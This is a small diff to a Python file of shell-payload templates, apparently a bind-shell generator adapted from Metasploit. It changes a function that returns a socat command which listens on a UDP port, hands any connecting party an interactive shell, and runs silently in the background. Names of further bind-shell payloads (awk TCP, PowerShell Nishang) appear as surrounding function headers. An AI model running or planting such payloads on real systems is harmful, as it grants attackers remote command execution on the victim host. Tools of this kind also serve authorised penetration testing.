@@ -59,7 +59,7 @@ def BIND_AWK_TCP():
 # Removed from MetasploitFramework
 # https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/singles/cmd/unix/bind_socat_udp.rb
 def BIND_SOCAT_UDP():
-    return "socat udp-listen:PORT exec:'bash -li',pty,stderr,sane 2>&1>/dev/null &"
+    return "socat udp-listen:PORT exec:'SHELL -li',pty,stderr,sane 2>&1>/dev/null &"
 
 
 def BIND_POWERSHELL_NISHANG_TCP():
